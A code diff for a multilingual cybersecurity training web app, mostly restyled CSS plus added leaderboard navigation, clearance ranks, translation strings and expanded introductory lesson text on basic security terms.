-  max-width: 60ch;
-}
-.hero-stats-row {
-  display: flex;
-  gap: 10px;
-  margin-top: 20px;
-  flex-wrap: wrap;
-}
-.mini-stat {
-  flex: 1;
-  min-width: 100px;
-  padding: 12px;
-  border: 1px solid var(--line);
-  border-radius: var(--radius);
-  background: var(--void-2);
-}
-.mini-stat .num {
-  font-family: var(--font-mono);
-  font-size: 20px;
-  color: var(--signal);
-  font-weight: 700;
-}
-.mini-stat .lbl {
-  font-size: 11.5px;
-  color: var(--paper-dim);
-  margin-top: 2px;
-}
+.hero-h1 { font-size: clamp(22px, 5vw, 30px); margin-bottom: 10px; }
+.hero-h1 .zero { color: var(--signal); }
+.hero-desc { color: var(--paper-dim); font-size: 14.5px; max-width: 60ch; }
+.hero-rank-row { display: flex; align-items: center; gap: 10px; margin-top: 16px; flex-wrap: wrap; }
+.hero-stats-row { display: flex; gap: 10px; margin-top: 20px; flex-wrap: wrap; }
+.mini-stat { flex: 1; min-width: 100px; padding: 12px; border: 1px solid var(--line); border-radius: var(--radius); background: var(--void-2); }
+.mini-stat .num { font-family: var(--font-mono); font-size: 20px; color: var(--signal); font-weight: 700; }
+.mini-stat .lbl { font-size: 11.5px; color: var(--paper-dim); margin-top: 2px; }
 
-.section-title {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  margin: 8px 0 16px;
+.cert-banner {
+  margin-bottom: 20px; padding: 16px 18px; border-radius: var(--radius-lg); border: 1px solid var(--gold);
+  background: rgba(255,209,102,.08); display: flex; align-items: center; gap: 12px; justify-content: space-between; flex-wrap: wrap;
 }
-.section-title h2 {
-  font-size: 17px;
-}
-.section-title .line {
-  flex: 1;
-  height: 1px;
-  background: var(--line-bright);
-}
+.cert-banner .t { font-size: 14px; color: var(--gold); font-weight: 700; }
 
-.module-grid {
-  display: grid;
-  grid-template-columns: 1fr;
-  gap: 12px;
-}
-@media(min-width: 640px) {
-  .module-grid {
-    grid-template-columns: 1fr 1fr;
-  }
-}
+.section-title { display: flex; align-items: center; gap: 10px; margin: 8px 0 16px; }
+.section-title h2 { font-size: 17px; }
+.section-title .line { flex: 1; height: 1px; background: var(--line-bright); }
+
+.module-grid { display: grid; grid-template-columns: 1fr; gap: 12px; }
+@media(min-width: 640px) { .module-grid { grid-template-columns: 1fr 1fr; } }
 .module-card {
-  padding: 16px;
-  border: 1px solid var(--line);
-  border-radius: var(--radius-lg);
-  background: var(--panel);
-  transition: all .18s var(--ease);
-  text-align: right;
-  position: relative;
-  overflow: hidden;
+  padding: 16px; border: 1px solid var(--line); border-radius: var(--radius-lg); background: var(--panel);
+  transition: all .18s var(--ease); text-align: right; position: relative; overflow: hidden;
 }
-.module-card.clickable {
-  cursor: pointer;
-}
-.module-card.clickable:hover {
-  border-color: var(--signal-dim);
-  transform: translateY(-2px);
-  box-shadow: 0 8px 24px rgba(0,0,0,.35);
-}
-.module-card.locked {
-  opacity: .5;
-  pointer-events: none;
-}
-.module-card-top {
-  display: flex;
-  justify-content: space-between;
-  align-items: flex-start;
-  margin-bottom: 10px;
-}
-.module-card-idx {
-  font-family: var(--font-mono);
-  font-size: 11px;
-  color: var(--signal);
-  direction: ltr;
-}
-.module-card h3 {
-  font-size: 15px;
-  margin-bottom: 6px;
-}
-.module-card p {
-  font-size: 12.5px;
-  color: var(--paper-dim);
-}
-.module-card-icon {
-  font-size: 22px;
-}
+.module-card.clickable { cursor: pointer; }
+.module-card.clickable:hover { border-color: var(--signal-dim); transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0,0,0,.35); }
+.module-card.locked { opacity: .5; pointer-events: none; }
+.module-card-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 10px; }
+.module-card-idx { font-family: var(--font-mono); font-size: 11px; color: var(--signal); direction: ltr; }
+.module-card h3 { font-size: 15px; margin-bottom: 6px; }
+.module-card p { font-size: 12.5px; color: var(--paper-dim); margin-bottom: 8px; }
+.module-card-icon { font-size: 22px; }
+.module-card-meta { display: flex; gap: 6px; flex-wrap: wrap; }
 
 /* Challenge Cards */
-.challenge-grid {
-  display: grid;
-  grid-template-columns: 1fr;
-  gap: 12px;
-}
-@media(min-width: 640px) {
-  .challenge-grid {
-    grid-template-columns: 1fr 1fr;
-  }
-}
-.challenge-card {
-  padding: 18px;
-  border: 1px solid var(--line);
-  border-radius: var(--radius-lg);
-  background: var(--panel);
-  position: relative;
-  transition: all .18s var(--ease);
-}
-.challenge-card.clickable {
-  cursor: pointer;
-}
-.challenge-card.clickable:hover {
-  border-color: var(--cyan);
-  transform: translateY(-2px);
-  box-shadow: 0 8px 22px rgba(0,0,0,.35);
-}
-.challenge-card.locked {
-  opacity: .45;
-  pointer-events: none;
-}
-.challenge-card .top-row {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-bottom: 10px;
-}
-.challenge-card .ico {
-  font-size: 26px;
-}
-.challenge-card h3 {
-  font-size: 14.5px;
-  margin-bottom: 4px;
-}
-.challenge-card p {
-  font-size: 12px;
-  color: var(--paper-dim);
-}
-.challenge-card .pts {
-  font-family: var(--font-mono);
-  font-size: 11px;
-  color: var(--signal);
-}
+.challenge-toolbar { display: flex; gap: 8px; margin-bottom: 16px; flex-wrap: wrap; }
+.filter-chip { font-family: var(--font-mono); font-size: 11.5px; padding: 6px 14px; border-radius: 20px; border: 1px solid var(--line-bright); color: var(--paper-dim); }
+.filter-chip.active { color: var(--signal); border-color: var(--signal-dim); background: var(--signal-soft); }
+.challenge-grid { display: grid; grid-template-columns: 1fr; gap: 12px; }
+@media(min-width: 640px) { .challenge-grid { grid-template-columns: 1fr 1fr; } }
+.challenge-card { padding: 18px; border: 1px solid var(--line); border-radius: var(--radius-lg); background: var(--panel); position: relative; transition: all .18s var(--ease); }
+.challenge-card.clickable { cursor: pointer; }
+.challenge-card.clickable:hover { border-color: var(--cyan); transform: translateY(-2px); box-shadow: 0 8px 22px rgba(0,0,0,.35); }
+.challenge-card.locked { opacity: .45; pointer-events: none; }
+.challenge-card .top-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+.challenge-card .ico { font-size: 26px; }
+.challenge-card h3 { font-size: 14.5px; margin-bottom: 4px; }
+.challenge-card p { font-size: 12px; color: var(--paper-dim); margin-bottom: 8px; }
+.challenge-card .pts { font-family: var(--font-mono); font-size: 11px; color: var(--signal); }
+.challenge-card .meta-row { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
 
 /* Badges */
-.badge-grid {
-  display: grid;
-  grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
-  gap: 12px;
-  margin-top: 14px;
-}
-.badge-tile {
-  padding: 14px 10px;
-  text-align: center;
-  border: 1px solid var(--line);
-  border-radius: var(--radius-lg);
-  background: var(--panel);
-}
-.badge-tile.earned {
-  border-color: var(--signal-dim);
-  background: var(--signal-soft);
-}
-.badge-tile .ico {
-  font-size: 26px;
-  margin-bottom: 6px;
-  filter: grayscale(1);
-  opacity: .4;
-}
-.badge-tile.earned .ico {
-  filter: none;
-  opacity: 1;
-}
-.badge-tile .nm {
-  font-size: 11.5px;
-  color: var(--paper-dim);
-}
-.badge-tile.earned .nm {
-  color: var(--paper);
-}
+.badge-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 12px; margin-top: 14px; }
+.badge-tile { padding: 14px 10px; text-align: center; border: 1px solid var(--line); border-radius: var(--radius-lg); background: var(--panel); }
+.badge-tile.earned { border-color: var(--signal-dim); background: var(--signal-soft); }
+.badge-tile .ico { font-size: 26px; margin-bottom: 6px; filter: grayscale(1); opacity: .4; }
+.badge-tile.earned .ico { filter: none; opacity: 1; }
+.badge-tile .nm { font-size: 11.5px; color: var(--paper-dim); }
+.badge-tile.earned .nm { color: var(--paper); }
+
+/* Leaderboard */
+.lb-row { display: flex; align-items: center; gap: 12px; padding: 12px 14px; border: 1px solid var(--line); border-radius: var(--radius); background: var(--panel); margin-bottom: 8px; }
+.lb-row.you { border-color: var(--signal); background: var(--signal-soft); }
+.lb-rank { font-family: var(--font-mono); font-size: 13px; color: var(--paper-faint); width: 28px; }
+.lb-row.you .lb-rank, .lb-row.top .lb-rank { color: var(--gold); }
+.lb-name { flex: 1; font-size: 13.5px; }
+.lb-xp { font-family: var(--font-mono); font-size: 12.5px; color: var(--signal); }
 
 /* Terminal */
-.term-window {
-  border: 1px solid var(--line-bright);
-  border-radius: var(--radius-lg);
-  overflow: hidden;
-  background: #01100a;
-}
-.term-body {
-  padding: 14px;
-  height: 300px;
-  overflow-y: auto;
-  font-family: var(--font-mono);
-  font-size: 13px;
-  direction: ltr;
-  text-align: left;
-}
-.term-line {
-  white-space: pre-wrap;
-  word-break: break-word;
-  color: var(--paper);
-  margin-bottom: 2px;
-}
-.term-inputrow {
-  display: flex;
-  align-items: center;
-  padding: 10px 14px;
-  border-top: 1px solid var(--line);
-  background: #01100a;
-}
-.term-prompt {
-  font-family: var(--font-mono);
-  color: var(--signal);
-  font-size: 13px;
-}
-.term-input {
-  flex: 1;
-  background: transparent;
-  border: none;
-  color: var(--paper);
-  font-family: var(--font-mono);
-  font-size: 13px;
-  direction: ltr;
-  text-align: left;
-  padding-inline-start: 8px;
-  outline: none;
-}
+.term-window { border: 1px solid var(--line-bright); border-radius: var(--radius-lg); overflow: hidden; background: #01100a; }
+.term-body { padding: 14px; height: 300px; overflow-y: auto; font-family: var(--font-mono); font-size: 13px; direction: ltr; text-align: left; }
+.term-line { white-space: pre-wrap; word-break: break-word; color: var(--paper); margin-bottom: 2px; }
+.term-inputrow { display: flex; align-items: center; padding: 10px 14px; border-top: 1px solid var(--line); background: #01100a; }
+.term-prompt { font-family: var(--font-mono); color: var(--signal); font-size: 13px; }
+.term-input { flex: 1; background: transparent; border: none; color: var(--paper); font-family: var(--font-mono); font-size: 13px; direction: ltr; text-align: left; padding-inline-start: 8px; outline: none; }
 
 /* Toast */
-#toastLayer {
-  position: fixed;
-  top: calc(var(--topbar-h) + 12px);
-  left: 50%;
-  transform: translateX(-50%);
-  z-index: 60;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  gap: 10px;
-  pointer-events: none;
-}
+#toastLayer { position: fixed; top: calc(var(--topbar-h) + 12px); left: 50%; transform: translateX(-50%); z-index: 60; display: flex; flex-direction: column; align-items: center; gap: 10px; pointer-events: none; }
 .toast {
-  pointer-events: auto;
-  min-width: 260px;
-  max-width: 90vw;
-  padding: 14px 18px;
-  border-radius: var(--radius-lg);
-  background: var(--panel);
-  border: 1px solid var(--signal);
-  box-shadow: 0 0 30px rgba(57,255,136,.25), 0 10px 30px rgba(0,0,0,.4);
-  display: flex;
-  align-items: center;
-  gap: 12px;
-  animation: toastIn .4s var(--ease) forwards;
+  pointer-events: auto; min-width: 260px; max-width: 90vw; padding: 14px 18px; border-radius: var(--radius-lg);
+  background: var(--panel); border: 1px solid var(--signal); box-shadow: 0 0 30px rgba(57,255,136,.25), 0 10px 30px rgba(0,0,0,.4);
+  display: flex; align-items: center; gap: 12px; animation: toastIn .4s var(--ease) forwards; opacity: 0;
 }
-.toast.leaving {
-  animation: toastOut .35s var(--ease) forwards;
-}
-@keyframes toastIn {
-  to { opacity: 1; }
-}
-@keyframes toastOut {
-  to { opacity: 0; transform: translateY(-10px); }
-}
+.toast.leaving { animation: toastOut .35s var(--ease) forwards; }
+@keyframes toastIn { to { opacity: 1; } }
+@keyframes toastOut { to { opacity: 0; transform: translateY(-10px); } }
 
-/* Settings Modal */
+/* Modal */
 .modal-overlay {
-  position: fixed;
-  inset: 0;
-  z-index: 70;
-  background: rgba(2,4,3,.75);
-  backdrop-filter: blur(3px);
-  display: flex;
-  align-items: flex-end;
-  justify-content: center;
-  opacity: 0;
-  visibility: hidden;
-  transition: opacity .25s, visibility .25s;
+  position: fixed; inset: 0; z-index: 70; background: rgba(2,4,3,.75); backdrop-filter: blur(3px);
+  display: flex; align-items: flex-end; justify-content: center; opacity: 0; visibility: hidden; transition: opacity .25s, visibility .25s;
 }
-.modal-overlay.open {
-  opacity: 1;
-  visibility: visible;
-}
-@media(min-width: 640px) {
-  .modal-overlay {
-    align-items: center;
-  }
-}
+.modal-overlay.open { opacity: 1; visibility: visible; }
+@media(min-width: 640px) { .modal-overlay { align-items: center; } }
 .modal-box {
-  width: 100%;
-  max-width: 480px;
-  max-height: 88vh;
-  overflow-y: auto;
-  background: var(--panel);
-  border: 1px solid var(--line-bright);
-  border-radius: var(--radius-lg) var(--radius-lg) 0 0;
-  padding: 22px;
-  transform: translateY(30px);
-  transition: transform .3s var(--ease);
+  width: 100%; max-width: 480px; max-height: 88vh; overflow-y: auto; background: var(--panel);
+  border: 1px solid var(--line-bright); border-radius: var(--radius-lg) var(--radius-lg) 0 0; padding: 22px;
+  transform: translateY(30px); transition: transform .3s var(--ease);
 }
-.modal-overlay.open .modal-box {
-  transform: translateY(0);
-}
-@media(min-width: 640px) {
-  .modal-box {
-    border-radius: var(--radius-lg);
-  }
-}
+.modal-overlay.open .modal-box { transform: translateY(0); }
+@media(min-width: 640px) { .modal-box { border-radius: var(--radius-lg); } }
+.modal-head { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
+.switch-row { display: flex; align-items: center; justify-content: space-between; padding: 10px 0; border-bottom: 1px solid var(--line); font-size: 13.5px; }
+.switch { position: relative; width: 40px; height: 22px; background: var(--void-2); border: 1px solid var(--line-bright); border-radius: 20px; cursor: pointer; }
+.switch.on { background: var(--signal-soft); border-color: var(--signal-dim); }
+.switch .dot { position: absolute; top: 2px; right: 2px; width: 16px; height: 16px; border-radius: 50%; background: var(--paper-faint); transition: all .2s var(--ease); }
+.switch.on .dot { background: var(--signal); right: 20px; }
+[dir="ltr"] .switch .dot { right: auto; left: 2px; }
+[dir="ltr"] .switch.on .dot { right: auto; left: 20px; }
 
 /* Quiz */
-.quiz-gate {
-  text-align: center;
-  padding: 26px 16px;
-  border: 1px dashed var(--line-bright);
-  border-radius: var(--radius-lg);
-  margin-top: 10px;
-}
-.quiz-q {
-  padding: 18px;
-  border: 1px solid var(--line);
-  border-radius: var(--radius-lg);
-  background: var(--panel);
-  margin-bottom: 14px;
-}
-.quiz-opt {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  padding: 12px 14px;
-  border: 1px solid var(--line-bright);
-  border-radius: var(--radius);
-  font-size: 13.5px;
-  transition: all .15s var(--ease);
-  text-align: right;
-  cursor: pointer;
-}
-.quiz-opt:hover {
-  border-color: var(--signal-dim);
-  background: var(--signal-soft);
-}
-.quiz-opt.correct {
-  border-color: var(--signal);
-  background: var(--signal-soft);
-}
-.quiz-opt.wrong {
-  border-color: var(--alert);
-  background: var(--alert-soft);
-}
+.quiz-gate { text-align: center; padding: 26px 16px; border: 1px dashed var(--line-bright); border-radius: var(--radius-lg); margin-top: 10px; }
+.quiz-q { padding: 18px; border: 1px solid var(--line); border-radius: var(--radius-lg); background: var(--panel); margin-bottom: 14px; }
+.quiz-opt { display: flex; align-items: center; gap: 10px; padding: 12px 14px; border: 1px solid var(--line-bright); border-radius: var(--radius); font-size: 13.5px; transition: all .15s var(--ease); text-align: right; cursor: pointer; margin-bottom: 8px; }
+.quiz-opt:hover { border-color: var(--signal-dim); background: var(--signal-soft); }
+.quiz-opt.correct { border-color: var(--signal); background: var(--signal-soft); }
+.quiz-opt.wrong { border-color: var(--alert); background: var(--alert-soft); }
+
+/* Multiple choice challenges (xss / hash) */
+.mc-option { display: block; width: 100%; text-align: right; padding: 14px; border: 1px solid var(--line-bright); border-radius: var(--radius); margin-bottom: 8px; font-size: 13px; transition: all .15s var(--ease); background: var(--void-2); }
+[dir="ltr"] .mc-option { text-align: left; }
+.mc-option code { font-family: var(--font-mono); color: var(--cyan); }
+.mc-option:hover { border-color: var(--cyan); }
+.mc-option.correct { border-color: var(--signal); background: var(--signal-soft); }
+.mc-option.wrong { border-color: var(--alert); background: var(--alert-soft); }
 
 /* File chrome */
-.file-chrome {
-  font-family: var(--font-mono);
-  direction: ltr;
-  text-align: left;
-  font-size: 12px;
-  color: var(--paper-faint);
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  margin-bottom: 14px;
-}
-.file-chrome .path {
-  color: var(--signal);
-}
+.file-chrome { font-family: var(--font-mono); direction: ltr; text-align: left; font-size: 12px; color: var(--paper-faint); display: flex; align-items: center; gap: 8px; margin-bottom: 14px; }
+.file-chrome .path { color: var(--signal); }
 
 /* Cipher */
-.cipher-text {
-  font-family: var(--font-mono);
-  font-size: 16px;
-  letter-spacing: .04em;
-  color: var(--signal);
-  direction: ltr;
-  text-align: center;
-  padding: 16px;
-  background: var(--void-2);
-  border-radius: var(--radius);
-  margin: 12px 0;
-  word-break: break-all;
-}
+.cipher-text { font-family: var(--font-mono); font-size: 16px; letter-spacing: .04em; color: var(--signal); direction: ltr; text-align: center; padding: 16px; background: var(--void-2); border-radius: var(--radius); margin: 12px 0; word-break: break-all; }
 
 /* Mail */
-.mail-card {
-  border: 1px solid var(--line);
-  border-radius: var(--radius-lg);
-  overflow: hidden;
-  background: var(--panel);
-  margin-bottom: 16px;
-}
-.mail-head {
-  padding: 14px 16px;
-  border-bottom: 1px solid var(--line);
-  background: var(--panel-2);
-}
-.mail-body {
-  padding: 16px;
-  font-size: 13.5px;
-  color: var(--paper-dim);
-  white-space: pre-wrap;
+.mail-card { border: 1px solid var(--line); border-radius: var(--radius-lg); overflow: hidden; background: var(--panel); margin-bottom: 16px; }
+.mail-head { padding: 14px 16px; border-bottom: 1px solid var(--line); background: var(--panel-2); }
+.mail-body { padding: 16px; font-size: 13.5px; color: var(--paper-dim); white-space: pre-wrap; }
+
+.hint-text { color: var(--cyan); margin-top: 8px; font-size: 12.5px; }
+.text-input {
+  width: 100%; padding: 10px; background: var(--void-2); border: 1px solid var(--line); border-radius: var(--radius);
+  color: var(--paper); margin-bottom: 8px; font-family: var(--font-mono); direction: ltr; text-align: left;
 }
 
-/* Responsive */
 @media(max-width: 420px) {
-  .hero-panel {
-    padding: 20px 16px;
-  }
-  .term-body {
-    height: 240px;
-  }
+  .hero-panel { padding: 20px 16px; }
+  .term-body { height: 240px; }
+}
+@media (prefers-reduced-motion: reduce) {
+  .view { animation: none; }
 }
 </style>
 </head>
@@ -1316,8 +487,8 @@ img {
       <button class="lang-btn" data-lang="ru">RU</button>
       <button class="lang-btn" data-lang="zh">中</button>
     </div>
-    <span class="stat-chip cyan">LV <b id="topLevel">1</b></span>
-    <span class="stat-chip">XP <b id="topXP">0</b></span>
+    <span class="stat-chip streak" id="streakChip" title="Streak">🔥 <b id="topStreak">0</b></span>
+    <span class="stat-chip cyan">XP <b id="topXP">0</b></span>
     <div class="user-pill" id="userPill"><span class="avatar" id="userAvatar">?</span><span id="userNameDisplay">زائر</span></div>
   </div>
 </header>
@@ -1325,16 +496,21 @@ img {
 <!-- ===================== SIDE NAV ===================== -->
 <div id="navOverlay" class="nav-overlay"></div>
 <nav id="sideNav" class="side-nav">
+  <div class="rank-card">
+    <div class="rank-name" id="rankName">صفر التصريح</div>
+    <div class="rank-next" id="rankNext">—</div>
+  </div>
   <div class="overall-progress-wrap">
     <div class="overall-progress-label"><span data-lang="progress">التقدم العام</span><span id="progressPct" class="mono">0%</span></div>
     <div class="progress-bar"><div id="overallProgressFill" class="progress-fill"></div></div>
-    <div id="levelLine" class="level-line">LV.1 // مبتدئ</div>
+    <div id="levelLine" class="level-line">LV.1</div>
   </div>
   <div class="nav-block-title" data-lang="modules">الوحدات التعليمية</div>
   <ul id="moduleNavList" class="module-nav-list"></ul>
   <div class="nav-cta-list">
     <button class="nav-cta" data-nav="home"><span>🏠</span><span data-lang="home">الرئيسية</span></button>
     <button class="nav-cta" data-nav="challenges"><span>⚡</span><span data-lang="challenges">مركز التحديات</span></button>
+    <button class="nav-cta" data-nav="leaderboard"><span>🏆</span><span data-lang="leaderboard">لوحة الصدارة</span></button>
     <button class="nav-cta" data-nav="badges"><span>🎖️</span><span data-lang="badges">الأوسمة</span></button>
     <button class="nav-cta" id="settingsBtn"><span>⚙️</span><span data-lang="settings">الإعدادات</span></button>
     <button class="nav-cta logout-cta" id="logoutBtn"><span>🚪</span><span data-lang="logout">تسجيل الخروج</span></button>
@@ -1350,6 +526,7 @@ img {
 <nav class="bottom-nav" id="bottomNav">
   <div class="bottom-nav-item active" data-nav="home"><span class="ico">🏠</span><span data-lang="home">الرئيسية</span></div>
   <div class="bottom-nav-item" data-nav="challenges"><span class="ico">⚡</span><span data-lang="challenges">تحديات</span></div>
+  <div class="bottom-nav-item" data-nav="leaderboard"><span class="ico">🏆</span><span data-lang="leaderboard">صدارة</span></div>
   <div class="bottom-nav-item" data-nav="badges"><span class="ico">🎖️</span><span data-lang="badges">أوسمة</span></div>
   <div class="bottom-nav-item" id="settingsMobileBtn"><span class="ico">⚙️</span><span data-lang="settings">إعدادات</span></div>
 </nav>
@@ -1360,14 +537,18 @@ img {
 <!-- ===================== SETTINGS MODAL ===================== -->
 <div id="settingsModal" class="modal-overlay">
   <div class="modal-box">
-    <div class="module-head"><h2>⚙️ الإعدادات</h2><button class="icon-btn" id="closeSettings">✕</button></div>
-    <div class="field">
+    <div class="modal-head"><h2>⚙️ <span data-lang="settings">الإعدادات</span></h2><button class="icon-btn" id="closeSettings">✕</button></div>
+    <div class="switch-row">
+      <span data-lang="reduce_motion">تقليل الحركة (مصفوفة الخلفية)</span>
+      <div class="switch" id="motionSwitch"><div class="dot"></div></div>
+    </div>
+    <div class="field" style="margin-top:14px;">
       <label>المساعد الذكي (API)</label>
       <select id="providerSelect"><option value="anthropic">Anthropic</option><option value="openrouter">OpenRouter</option></select>
     </div>
     <div class="field">
       <label>النموذج</label>
-      <input id="modelInput" type="text" class="ltr" placeholder="claude-3-5-sonnet">
+      <input id="modelInput" type="text" class="ltr" placeholder="claude-sonnet-4-6">
     </div>
     <div class="field">
       <label>مفتاح API</label>
@@ -1394,11 +575,17 @@ const TR = {
     reg_error_empty: 'املأ جميع الحقول', reg_error_match: 'كلمتا المرور غير متطابقتين', reg_error_exists: 'اسم المستخدم موجود',
     reg_success: 'تم إنشاء الحساب',
     home: 'الرئيسية', modules: 'الوحدات التعليمية', challenges: 'مركز التحديات', badges: 'الأوسمة',
-    settings: 'الإعدادات', logout: 'تسجيل الخروج', progress: 'التقدم العام',
+    leaderboard: 'لوحة الصدارة', settings: 'الإعدادات', logout: 'تسجيل الخروج', progress: 'التقدم العام',
     completed: 'مكتمل', available: 'متاح', locked: 'مقفل',
     start_quiz: 'بدء الاختبار', finish: 'إنهاء', retry: 'إعادة', correct: 'صحيح', wrong: 'خطأ',
     decode: 'فك التشفير', phishing: 'تحليل بريد', terminal: 'محاكاة طرفية',
-    password: 'قوة كلمة المرور', sqli: 'حقن SQL', log: 'تحليل السجلات', boss: 'تحدي الزعيم'
+    password: 'قوة كلمة المرور', sqli: 'حقن SQL', log: 'تحليل السجلات', boss: 'تحدي الزعيم',
+    reduce_motion: 'تقليل الحركة', streak: 'التتابع', you: 'أنت', all: 'الكل',
+    easy: 'سهل', medium: 'متوسط', hard: 'صعب', hint: 'تلميح', hint_cost: 'تلميح (-10 XP)',
+    select_vuln: 'اختر الحقل المعرض للاختراق', pick_answer: 'اختر نوع التجزئة الصحيح',
+    all_modules_done: '🎓 لقد أكملت جميع الوحدات — تصريح كامل ممنوح!',
+    rank_next: 'إلى الرتبة التالية', max_rank: 'أعلى رتبة تم بلوغها',
+    submit: 'إرسال', check: 'تحقق', xp_short: 'XP'
   },
   en: {
     auth_subtitle: 'Cybersecurity Training Platform',
@@ -1409,11 +596,17 @@ const TR = {
     reg_error_empty: 'Fill all fields', reg_error_match: 'Passwords do not match', reg_error_exists: 'Username exists',
     reg_success: 'Account created',
     home: 'Home', modules: 'Training Modules', challenges: 'Challenges', badges: 'Badges',
-    settings: 'Settings', logout: 'Logout', progress: 'Overall Progress',
+    leaderboard: 'Leaderboard', settings: 'Settings', logout: 'Logout', progress: 'Overall Progress',
     completed: 'Completed', available: 'Available', locked: 'Locked',
     start_quiz: 'Start Quiz', finish: 'Finish', retry: 'Retry', correct: 'Correct', wrong: 'Wrong',
     decode: 'Decode', phishing: 'Phishing Analysis', terminal: 'Terminal Sim',
-    password: 'Password Strength', sqli: 'SQL Injection', log: 'Log Analysis', boss: 'Boss Challenge'
+    password: 'Password Strength', sqli: 'SQL Injection', log: 'Log Analysis', boss: 'Boss Challenge',
+    reduce_motion: 'Reduce motion', streak: 'Streak', you: 'You', all: 'All',
+    easy: 'Easy', medium: 'Medium', hard: 'Hard', hint: 'Hint', hint_cost: 'Hint (-10 XP)',
+    select_vuln: 'Pick the field vulnerable to attack', pick_answer: 'Pick the correct hash type',
+    all_modules_done: '🎓 You completed every module — Full Clearance granted!',
+    rank_next: 'to next rank', max_rank: 'Top rank reached',
+    submit: 'Submit', check: 'Check', xp_short: 'XP'
   },
   ru: {
     auth_subtitle: 'Платформа кибербезопасности',
@@ -1424,7 +617,7 @@ const TR = {
     reg_error_empty: 'Заполните поля', reg_error_match: 'Пароли не совпадают', reg_error_exists: 'Имя занято',
     reg_success: 'Аккаунт создан',
     home: 'Главная', modules: 'Модули', challenges: 'Испытания', badges: 'Значки',
-    settings: 'Настройки', logout: 'Выйти', progress: 'Прогресс',
+    leaderboard: 'Таблица лидеров', settings: 'Настройки', logout: 'Выйти', progress: 'Прогресс',
     completed: 'Завершено', available: 'Доступно', locked: 'Заблокировано',
     start_quiz: 'Тест', finish: 'Завершить', retry: 'Ещё раз', correct: 'Верно', wrong: 'Неверно',
     decode: 'Декод', phishing: 'Фишинг', terminal: 'Терминал',
@@ -1439,7 +632,7 @@ const TR = {
     reg_error_empty: '请填写所有字段', reg_error_match: '密码不匹配', reg_error_exists: '用户名已存在',
     reg_success: '账户创建成功',
     home: '首页', modules: '模块', challenges: '挑战', badges: '徽章',
-    settings: '设置', logout: '退出', progress: '总进度',
+    leaderboard: '排行榜', settings: '设置', logout: '退出', progress: '总进度',
     completed: '已完成', available: '可用', locked: '已锁定',
     start_quiz: '开始测验', finish: '完成', retry: '重试', correct: '正确', wrong: '错误',
     decode: '解码', phishing: '钓鱼分析', terminal: '终端模拟',
@@ -1447,92 +640,153 @@ const TR = {
   }
 };
 
-// ==================== APP STATE ====================
-const DEFAULT_STATE = {
-  completedModules: [],
-  completedQuizzes: {},
-  completedChallenges: {},
-  earnedBadges: [],
-  bossCompleted: false,
-  xp: 0,
-  settings: { provider: 'anthropic', model: 'claude-3-5-sonnet', apiKey: '' }
-};
+// ==================== CLEARANCE RANKS ====================
+const CLEARANCE_RANKS = [
+  { min: 0,    ar: 'صفر التصريح',   en: 'Clearance Zero' },
+  { min: 200,  ar: 'مراقب',         en: 'Observer' },
+  { min: 600,  ar: 'عميل ميداني',   en: 'Field Operative' },
+  { min: 1200, ar: 'محلل أمني',     en: 'Security Analyst' },
+  { min: 2000, ar: 'أخصائي',        en: 'Specialist' },
+  { min: 3200, ar: 'تصريح كامل',    en: 'Full Clearance' }
+];
+function getRankIndex(xp) {
+  let idx = 0;
+  CLEARANCE_RANKS.forEach((r, i) => { if (xp >= r.min) idx = i; });
+  return idx;
+}
+function rankLabel(i) { return currentLang === 'en' ? CLEARANCE_RANKS[i].en : CLEARANCE_RANKS[i].ar; }
 
-let APP = JSON.parse(JSON.stringify(DEFAULT_STATE));
+// ==================== APP STATE ====================
+const DEFAULT_PROGRESS = () => ({
+  completedModules: [], completedQuizzes: {}, completedChallenges: [], earnedBadges: [],
+  xp: 0, streak: 0, lastLoginDate: null, hintsUsed: {}
+});
+const APP = { settings: { provider: 'anthropic', model: 'claude-sonnet-4-6', apiKey: '', reduceMotion: false } };
+
 let currentLang = 'ar';
 let currentUser = null;
 let userProgress = null;
+let matrixTimer = null;
 
 const USERS_KEY = 'cz_users';
 const CURRENT_USER_KEY = 'cz_user';
 
 // ==================== EDUCATIONAL DATA ====================
 const MODULES_DATA = [
-  { id: 'm1', idx: '01', title: 'مقدمة في الأمن السيبراني', desc: 'أساسيات الأمن السيبراني وأنواع التهديدات', icon: '🛡️', req: null,
+  { id: 'm1', idx: '01', title: 'مقدمة في الأمن السيبراني', desc: 'أساسيات الأمن السيبراني وأنواع التهديدات', icon: '🛡️', req: null, time: '10 د',
     lessons: [
-      { title: 'ما هو الأمن السيبراني؟', content: 'الأمن السيبراني هو ممارسة حماية الأنظمة والشبكات والبرامج من الهجمات الرقمية.' },
-      { title: 'مصطلحات أساسية', content: 'التهديد، الثغرة، الاختراق، التصيد، البرمجيات الخبيثة.' }
+      { title: 'ما هو الأمن السيبراني؟', content: 'الأمن السيبراني هو ممارسة حماية الأنظمة والشبكات والبرامج من الهجمات الرقمية التي تهدف عادةً للوصول إلى معلومات حساسة أو تعطيل العمليات أو ابتزاز المستخدمين.' },
+      { title: 'مصطلحات أساسية', content: 'التهديد (Threat): أي خطر محتمل. الثغرة (Vulnerability): نقطة ضعف قابلة للاستغلال. الاختراق (Breach): نجاح الوصول غير المصرح به. التصيد (Phishing): خداع لسرقة المعلومات. البرمجيات الخبيثة (Malware): برامج ضارة.' },
+      { title: 'مثلث CIA', content: 'السرية (Confidentiality)، السلامة (Integrity)، التوافر (Availability) — الأعمدة الثلاثة التي يبنى عليها أي برنامج أمني.' }
     ],
     quiz: [
       { q: 'ما الهدف الرئيسي للأمن السيبراني؟', opts: ['حماية الأنظمة والبيانات', 'تسريع الإنترنت', 'تصميم المواقع', 'بيع البرامج'], ans: 0 },
-      { q: 'ما هو التصيد (Phishing)؟', opts: ['نوع من الفيروسات', 'خداع المستخدمين للحصول على معلوماتهم', 'جدار حماية', 'برنامج نسخ'], ans: 1 }
